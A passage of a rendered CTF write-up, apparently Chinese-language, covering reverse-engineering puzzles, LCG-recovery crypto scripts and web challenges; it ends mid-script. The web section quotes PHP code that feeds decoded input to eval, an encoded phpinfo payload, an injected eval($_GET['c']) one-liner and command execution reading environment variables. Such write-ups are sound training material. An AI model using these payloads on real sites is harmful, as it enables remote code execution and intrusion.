+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>
+    <img src="../imgs/image-20250929180435938.png" alt="image-20250929180435938"  loading="lazy" /></p>
+<p>获得flag</p>
+<h3>Puzzle<span class="hx:absolute hx:-mt-20" id="puzzle"></span>
+    <a href="#puzzle" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>flag第一部分
+    <img src="../imgs/image-20250929195557903.png" alt="image-20250929195557903"  loading="lazy" /></p>
+<p>
+    <img src="../imgs/image-20250929195609309.png" alt="image-20250929195609309"  loading="lazy" /></p>
+<p>应该就是Do_Y0u_</p>
+<p>flag的第二部分是这个函数名Like_7his_Jig</p>
+<p>
+    <img src="../imgs/image-20250929194545037.png" alt="image-20250929194545037"  loading="lazy" /></p>
+<p>这是第三部分</p>
+<p>
+    <img src="../imgs/image-20250929194841997.png" alt="image-20250929194841997"  loading="lazy" /></p>
+<p>提取出数据，写脚本解密0xD7D7D8DDF2DAEDDE，提取出来的数据是小端序的需要反着输出</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e"># 将 64 位整数转换为字节数组并反转</span>
+</span></span><span style="display:flex;"><span>encrypted_hex <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xD7D7D8DDF2DAEDDE</span>
+</span></span><span style="display:flex;"><span>encrypted_bytes <span style="color:#f92672">=</span> encrypted_hex<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;little&#39;</span>)  <span style="color:#75715e"># 小端序</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># XOR 解密</span>
+</span></span><span style="display:flex;"><span>decrypted <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> byte <span style="color:#f92672">in</span> encrypted_bytes:
+</span></span><span style="display:flex;"><span>    decrypted<span style="color:#f92672">.</span>append(byte <span style="color:#f92672">^</span> <span style="color:#ae81ff">0xAD</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 转换为字符串</span>
+</span></span><span style="display:flex;"><span>flag_part <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(chr(b) <span style="color:#66d9ef">for</span> b <span style="color:#f92672">in</span> decrypted)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;解密结果: </span><span style="color:#e6db74">{</span>flag_part<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>解密结果为s@w_puzz</p>
+<p>flag的第4部分</p>
+<p>
+    <img src="../imgs/image-20250929195226772.png" alt="image-20250929195226772"  loading="lazy" /></p>
+<p>1e_Gam3</p>
+<p>最后flag拼接起来为flag{Do_Y0u_Like_7his_Jigs@w_puzz1e_Gam3}</p>
+<h3>EzMyDroid<span class="hx:absolute hx:-mt-20" id="ezmydroid"></span>
+    <a href="#ezmydroid" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>jadx打开，找到加密逻辑，发现是AES-ECB模式，提取KEY和密文</p>
+<p>
+    <img src="../imgs/image-20250929230009064.png" alt="image-20250929230009064"  loading="lazy" /></p>
+<p>使用工具解密得到flag</p>
+<p>
+    <img src="../imgs/image-20250929225917382.png" alt="image-20250929225917382"  loading="lazy" /></p>
+<h3>plzdebugme<span class="hx:absolute hx:-mt-20" id="plzdebugme"></span>
+    <a href="#plzdebugme" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>先拖进Linux运行看看，发现有提示，接下来使用IDA远程调试</p>
+<p>
+    <img src="../imgs/image-20250930141017413.png" alt="image-20250930141017413"  loading="lazy" /></p>
+<p>断点下在这里</p>
+<p>
+    <img src="../imgs/image-20250930142049230.png" alt="image-20250930142049230"  loading="lazy" /></p>
+<p>调试</p>
+<p>
+    <img src="../imgs/image-20250930142133935.png" alt="image-20250930142133935"  loading="lazy" /></p>
+<p>鼠标点进去看flag的内容</p>
+<p>
+    <img src="../imgs/image-20250930141930614.png" alt="image-20250930141930614"  loading="lazy" /></p>
+<p>shift+e提取出来</p>
+<p>
+    <img src="../imgs/image-20250930141955627.png" alt="image-20250930141955627"  loading="lazy" /></p>
+<p>flag{It3_D3bugG_T11me!_le3_play}</p>
+<h2>挑战<span class="hx:absolute hx:-mt-20" id="挑战"></span>
+    <a href="#%e6%8c%91%e6%88%98" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><h3>[Cry]随机数之旅1.3<span class="hx:absolute hx:-mt-20" id="cry随机数之旅13"></span>
+    <a href="#cry%e9%9a%8f%e6%9c%ba%e6%95%b0%e4%b9%8b%e6%97%8513" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>解密脚本</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> long_to_bytes
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> <span style="color:#ae81ff">478475545597700801137542329947268027178596565166277501475984783168264336204134464479893480035711325623</span>
+</span></span><span style="display:flex;"><span>hint <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">249919247565764496968024420668100990050724930264873012553221627994767139138419916559737152956192938786</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">341098538517870638403021803297435486563954299904421591195678329627022088404800269966659959073623486227</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">20018219100052262465673657639106096626775270934552714906385093540517665089433306304783945869390965352</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">477110987927537932362183022083084081803652185884243696031637228688890267574215943741789667631285188517</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">316109317526042308856009312339591028959770431193022541894694590723163440242617594274841279773268292931</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">288838512929949193288464156452590499193348618769922838206940876596503314942400180385295933551444987426</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">181266945000896484248052902194760405660042158622313374086868842724033187572461235292532472052806294610</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">363891817161955280083221864938995130581363107122643810787521989924285652140760869565757181912307151144</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">176158258425616548246181359314308658522975855113878838400631572536985398273419876407488652665740506588</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">226304243444318985869957901105733987782986057182483943969163921743774283862329285859875298207849486395</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">235563126973016483026307105002236457145848856279569924823679216801904771557144382780782533443602319128</span>
+</span></span><span style="display:flex;"><span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 计算 a</span>
+</span></span><span style="display:flex;"><span>num <span style="color:#f92672">=</span> (hint[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">-</span> hint[<span style="color:#ae81ff">1</span>]) <span style="color:#f92672">%</span> p
+</span></span><span style="display:flex;"><span>den <span style="color:#f92672">=</span> (hint[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">-</span> hint[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">%</span> p
+</span></span><span style="display:flex;"><span>a <span style="color:#f92672">=</span> (num <span style="color:#f92672">*</span> pow(den, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, p)) <span style="color:#f92672">%</span> p
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 计算 m</span>
+</span></span><span style="display:flex;"><span>m <span style="color:#f92672">=</span> (hint[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">-</span> a <span style="color:#f92672">*</span> hint[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">%</span> p
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 转为 flag</span>
+</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> long_to_bytes(m)
+</span></span><span style="display:flex;"><span>print(flag<span style="color:#f92672">.</span>decode())</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>
+    <img src="../imgs/image-20251001204816465.png" alt="image-20251001204816465"  loading="lazy" /></p>
+<h3>[Cry]随机数之旅1.9<span class="hx:absolute hx:-mt-20" id="cry随机数之旅19"></span>
+    <a href="#cry%e9%9a%8f%e6%9c%ba%e6%95%b0%e4%b9%8b%e6%97%8519" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>解密脚本</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> math <span style="color:#f92672">import</span> gcd, isqrt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> long_to_bytes, isPrime
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>hint <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">207815833858860472630525746720294722862686098236015762403351705374683468788325370179356514749526876950</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">211015979308620411696525425095777275753476560571747569104626146643460892934355111246007348590054728278</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">154982921170646039127386113914327168037474092849926050668784589159876343568545829713567339881566128774</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">14301447927625534901480862591544923748585828474154787997664067408999800058813140550333919836238991874</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">274602491551514790133598749654877237076653637818520480950523811116227833787921484758457209356323726695</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">170369781650509946447172258827489337909221053707541176039704241960102824673107536295921548339896943064</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">199159531778559581852282705906428311276685520954787407093495692307498420437271623202700142459262344361</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">152127625735448140599545820146663204043528582114006890378053333070292552669943282154992607592819602345</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">258118974363253374610905261929872690383062999526270455540048172948029807006984567635623967904079172525</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">83791161992040915418707637123797436818204732030321155500557330793843135987740494961151450687354553588</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">240283309715668400040909429066350841404133576389215959280394956765762171700654715262676050019779801415</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">38842976594694523258855648781570648918799284259234846435828069057016223394465201311284210539158742069</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">112124551443162148461799084208953311502063130294653691708825709872287471313112327095490868557801413814</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">130493216949781764571166990014451012680060230560283908734192439983915035889157778838781734918556337718</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">257057021216255933786617119107267370802049994234255480193196121654281929053027702977268758326889526999</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">50825978665892428834553479141064382082596923815786131694407281600281500668374124718717621345592142201</span>
+</span></span><span style="display:flex;"><span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 计算差分</span>
+</span></span><span style="display:flex;"><span>d <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(hint) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>):
+</span></span><span style="display:flex;"><span>    d<span style="color:#f92672">.</span>append(hint[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">-</span> hint[i])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 计算 T_k = d_{k+1} * d_0 - d_k * d_1</span>
+</span></span><span style="display:flex;"><span>T <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, len(d) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>):
+</span></span><span style="display:flex;"><span>    T<span style="color:#f92672">.</span>append(d[k <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">*</span> d[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">-</span> d[k] <span style="color:#f92672">*</span> d[<span style="color:#ae81ff">1</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 通过 gcd 恢复 p_candidate</span>
+</span></span><span style="display:flex;"><span>p_candidate <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(T)):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>, len(T)):
+</span></span><span style="display:flex;"><span>        g <span style="color:#f92672">=</span> gcd(T[i], T[j])
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> g <span style="color:#f92672">&gt;</span> p_candidate:
+</span></span><span style="display:flex;"><span>            p_candidate <span style="color:#f92672">=</span> g
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Recovered p_candidate =&#34;</span>, p_candidate)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Bit length:&#34;</span>, p_candidate<span style="color:#f92672">.</span>bit_length())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 分解 p_candidate 找到真正的素数 p</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_large_prime_factor</span>(n):
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 检查是否是素数</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> isPrime(n):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> n
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 试除小因子</span>
+</span></span><span style="display:flex;"><span>    factors <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>    temp <span style="color:#f92672">=</span> n
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> [<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">23</span>, <span style="color:#ae81ff">29</span>, <span style="color:#ae81ff">31</span>]:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> temp <span style="color:#f92672">%</span> p <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>            factors<span style="color:#f92672">.</span>append(p)
+</span></span><span style="display:flex;"><span>            temp <span style="color:#f92672">//=</span> p
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 如果剩下的数是素数，返回它</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> isPrime(temp):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> temp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 否则继续分解</span>
+</span></span><span style="display:flex;"><span>    f <span style="color:#f92672">=</span> <span style="color:#ae81ff">37</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> f <span style="color:#f92672">*</span> f <span style="color:#f92672">&lt;=</span> temp <span style="color:#f92672">and</span> f <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">10</span> <span style="color:#f92672">**</span> <span style="color:#ae81ff">7</span>:  <span style="color:#75715e"># 限制搜索范围</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> temp <span style="color:#f92672">%</span> f <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>            factors<span style="color:#f92672">.</span>append(f)
+</span></span><span style="display:flex;"><span>            temp <span style="color:#f92672">//=</span> f
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> isPrime(temp):
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> temp
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            f <span style="color:#f92672">+=</span> <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 返回最大的因子</span>
+</span></span><span style="display:flex;"><span>    all_factors <span style="color:#f92672">=</span> factors <span style="color:#f92672">+</span> [temp]
+</span></span><span style="display:flex;"><span>    prime_factors <span style="color:#f92672">=</span> [x <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> all_factors <span style="color:#66d9ef">if</span> isPrime(x)]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> prime_factors:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> max(prime_factors)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> max(all_factors)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> find_large_prime_factor(p_candidate)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Extracted prime p =&#34;</span>, p)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Is p prime?&#34;</span>, isPrime(p))
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;p bit length:&#34;</span>, p<span style="color:#f92672">.</span>bit_length())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 尝试恢复 a 和 m</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(hint) <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span>):
+</span></span><span style="display:flex;"><span>    num <span style="color:#f92672">=</span> (hint[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>] <span style="color:#f92672">-</span> hint[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>]) <span style="color:#f92672">%</span> p
+</span></span><span style="display:flex;"><span>    den <span style="color:#f92672">=</span> (hint[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">-</span> hint[i]) <span style="color:#f92672">%</span> p
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> gcd(den, p) <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            inv_den <span style="color:#f92672">=</span> pow(den, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, p)
+</span></span><span style="display:flex;"><span>            a <span style="color:#f92672">=</span> (num <span style="color:#f92672">*</span> inv_den) <span style="color:#f92672">%</span> p
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Recovered a using hints[</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>i <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span><span style="color:#e6db74">}</span><span style="color:#e6db74">] =&#34;</span>, a)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># 恢复 m</span>
+</span></span><span style="display:flex;"><span>            m <span style="color:#f92672">=</span> (hint[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">-</span> a <span style="color:#f92672">*</span> hint[i]) <span style="color:#f92672">%</span> p
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># 转为 flag</span>
+</span></span><span style="display:flex;"><span>            flag <span style="color:#f92672">=</span> long_to_bytes(m)
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;Flag:&#34;</span>, flag<span style="color:#f92672">.</span>decode())
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">ValueError</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Error with hints[</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>i <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span><span style="color:#e6db74">}</span><span style="color:#e6db74">]:&#34;</span>, e)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Failed to recover a and m with all hint pairs&#34;</span>)</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>
+    <img src="../imgs/image-20251001210310543.png" alt="image-20251001210310543"  loading="lazy" /></p>
+<h1>Week2</h1><h2>Web<span class="hx:absolute hx:-mt-20" id="web-1"></span>
+    <a href="#web-1" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><h3>DD加速器<span class="hx:absolute hx:-mt-20" id="dd加速器"></span>
+    <a href="#dd%e5%8a%a0%e9%80%9f%e5%99%a8" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>打开页面尝试命令执行，去读flag，发现flag不在/flag里尝试读环境变量</p>
+<p>
+    <img src="../imgs/image-20251006120306640.png" alt="image-20251006120306640"  loading="lazy" /></p>
+<p>
+    <img src="../imgs/image-20251006120358044.png" alt="image-20251006120358044"  loading="lazy" /></p>
+<h3>真的是签到诶<span class="hx:absolute hx:-mt-20" id="真的是签到诶"></span>
+    <a href="#%e7%9c%9f%e7%9a%84%e6%98%af%e7%ad%be%e5%88%b0%e8%af%b6" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>打开页面后发现代码，分析一下</p>
+<p>
+    <img src="../imgs/image-20251006120648789.png" alt="image-20251006120648789"  loading="lazy" /></p>
+<p>首先这个函数实现了Atbash密码 简单的替换密码 A-Z，逆运算再加密一遍</p>
+<p>if ($cipher) {
+$cipher = base64_decode($cipher);
+$encoded = atbash($cipher);
+$encoded = str_replace(&rsquo; &lsquo;, &lsquo;&rsquo;, $encoded);
+$encoded = str_rot13($encoded);
+@eval($encoded);
+exit;
+}再分析这里将参数先base64解码，然后atbash加密，然后去空格，rot13一下最后交给eval去执行</p>
+<p>比如这里我想执行phpinfo(); 应该先rot13 -&gt; atbash加密 -&gt; base64编码 ，应该是这样的值：</p>
+<p>eGZ4ZXpoeSgpOw==</p>
+<p>
+    <img src="../imgs/image-20251006122044402.png" alt="image-20251006122044402"  loading="lazy" /></p>
+<p>一个eval($_GET[&lsquo;c&rsquo;]); 传参给c去绕过限制</p>
+<p>
+    <img src="../imgs/image-20251006122152939.png" alt="image-20251006122152939"  loading="lazy" /></p>
+<p>
+    <img src="../imgs/image-20251006122248271.png" alt="image-20251006122248271"  loading="lazy" /></p>
+<p>发现这样是可以的，接下来直接命令执行找flag即可</p>
+<p>
+    <img src="../imgs/image-20251006122333034.png" alt="image-20251006122333034"  loading="lazy" /></p>
+<h3>搞点哦润吉吃吃橘<span class="hx:absolute hx:-mt-20" id="搞点哦润吉吃吃橘"></span>
+    <a href="#%e6%90%9e%e7%82%b9%e5%93%a6%e6%b6%a6%e5%90%89%e5%90%83%e5%90%83%e6%a9%98" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>f12发现提示</p>
+<p>
+    <img src="../imgs/image-20251006122645760.png" alt="image-20251006122645760"  loading="lazy" /></p>
+<p>成功登录后来到这个页面</p>
+<p>
+    <img src="../imgs/image-20251006122745703.png" alt="image-20251006122745703"  loading="lazy" /></p>
+<p>抓包开始验证发现提示：doro记得这里会在session里面添加验证参数, 也许Set-Cookie可以帮助我们&hellip;&hellip;</p>
+<p>表达式直接写在返回包里了，这里每次的 Cookie 不一样，测试之后发现用 session 也能获取返回包。Python 写脚本获取flag</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># # Doro/Doro_nJlPVs_@123</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> fake_useragent <span style="color:#f92672">import</span> UserAgent
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>user_agent <span style="color:#f92672">=</span> UserAgent()<span style="color:#f92672">.</span>google
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">expr</span>():
